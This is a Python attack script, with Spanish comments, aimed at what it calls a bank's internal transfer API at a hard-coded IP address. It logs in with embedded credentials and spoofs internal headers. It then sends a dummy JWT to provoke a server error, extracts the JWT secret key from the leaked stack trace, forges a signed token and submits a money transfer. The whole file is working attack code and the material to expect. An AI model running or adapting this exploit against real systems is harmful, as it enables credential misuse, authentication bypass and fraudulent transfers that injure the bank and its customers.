import requests
import json
import re
import jwt

JWT_SECRET_KEY = ""

# URL base del sistema interno del banco
HOST = "http://80.78.30.242:9181"
API_XFER = f"{HOST}/api/send-transfer"
API_LOGIN = f"{HOST}/api/login/"

# Headers internos del sistema bancario
HEADERS = {
    "Host": "80.78.30.242",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-ES",
    "X-Requested-With": "XMLHttpRequest",
    "X-Session-Type": "BANCO-INTERNAL",
    "Accept": "application/json",
    "Accept-Language": "es;q=0.9,en;q=0.8",
    "Content-Type": "application/json",
}

# === Paso 0: Crear token JWT dummy para provocar error ===
def generate_dummy_jwt():
    dummy = jwt.encode({"username": "dummyadmin", "iat": 1751788867, "exp": 1751792467}, "shhhhhhhhhhh", algorithm="HS256")
    return dummy

# === Paso 1: Hacer login web para obtener el `sessionid` ===
def login_bank_session():
    session = requests.Session()
    session.headers.update(HEADERS)

    login_data = {
        "username": "markmur88",
        "password": "Ptf8454Jd55"
    }

    print("\n[+] Iniciando sesión web del gerente.")
    login_response = session.post(API_LOGIN, json=login_data)
    
    if login_response.status_code == 200:
        j = login_response.json()
        session.cookies.update(login_response.cookies.get_dict())
        print("[+] Cookies tras login:", session.cookies)
        return session, j.get("token") or generate_dummy_jwt()
    else:
        print("[-] No fue exito el login. Status:", login_response.status_code)
        return session, generate_dummy_jwt()

# === Paso 2: Obligar al sistema a exponer el middleware JWT ===
def trigger_jwt_decode(session, dummy_jwt):
    print("\n[+] Enviando JWT dummy para generar un error interno en Django")
    print("[+] Si el middleware responde con stacktrace, sacaré la JWT_SECRET_KEY")

    session.headers.update({
        "Authorization": f"Bearer {dummy_jwt}"
    })

    payload = {
        "debtor_account_id": 1,
        "creditor_account_id": 1,
        "instructed_amount": "100.00",
        "currency": "EUR",
        "purpose_code": "GDSV",
        "remittance_information_unstructured": "Token dummy JWT inyectado"
    }

    error_response = session.post(API_XFER, json=payload)
    return error_response

# === Paso 3: Probar error interno en middleware ===
def inject_insecure_jwt():
    session, real_jwt = login_bank_session()
    dummy_jwt = generate_dummy_jwt()

    response = trigger_jwt_decode(session, dummy_jwt)

    if response.status_code == 500:
        print("\n[+] Error interno del servidor. Middleware JWT está fallando...")
        text = response.text

        if "JWT_SECRET_KEY" in text:
            key_match = re.search(r"JWT_SECRET_KEY.*?=.*?(['\"])(.*?)\1", text)
            if key_match:
                print("[+] 🔑 JWT_SECRET_KEY filtrada desde middleware:", key_match.group(2))
                return key_match.group(2)

        token_match = re.search("InvalidSignatureError.*?Key: (.*?)$", text)
        if token_match:
            JWT_SECRET_KEY = token_match.group(1)
            print("[+] Usaré el middleware para firmar un token válido.")

    elif response.status_code == 401:
        print("[-] Recibimos 401. El middleware sigue validando JWT_SECRET_KEY desde Django.")
    else:
        print("[-] No hay error en la API. Recibimos:", response.status_code)

    return None

# === Paso 4: Forjar nuevo token con la JWT_SECRET_KEY interna ===
def forge_valid_jwt(jwt_key):
    import time

    valid = jwt.encode({
        "username": "markmur88",
        "iat": int(time.time()),
        "exp": int(time.time()) + 14400,
        "jti": "fakejti1234567890",
        "ip_source": "192.168.1.10"
    }, jwt_key, algorithm="HS256")
    return valid

# === Paso 5: Inyectar con JWT_SECRET_KEY si la capturamos ===
def inject_with_real_jwt():
    final_key = inject_insecure_jwt()
    if final_key:
        session, _ = login_bank_session()
        true_jwt = forge_valid_jwt(final_key)

        print("\n[+] Token forzado:", true_jwt[:100] + "...")

        session.headers.update({
            "Authorization": f"Bearer {true_jwt}",
            "X-Token-ID": true_jwt
        })

        transfer_data = {
            "payment_id": "550e8400-e29b-41d4-a716-426614174000",
            "debtor_account_id": 1,
            "creditor_account_id": 1,
            "instructed_amount": 100.00,
            "currency": "EUR",
            "status": "ACTC",
            "remittance_information_unstructured": "Aprobado por autenticación interna",
            "requested_execution_date": "2025-07-06T08:41:00Z"
        }

        transfer_response = session.post(API_XFER, json=transfer_data)
        print("Status de inyección:", transfer_response.status_code)
        print("Texto:", transfer_response.text)

# === Final del ataque ===
if __name__ == "__main__":
    inject_with_real_jwt()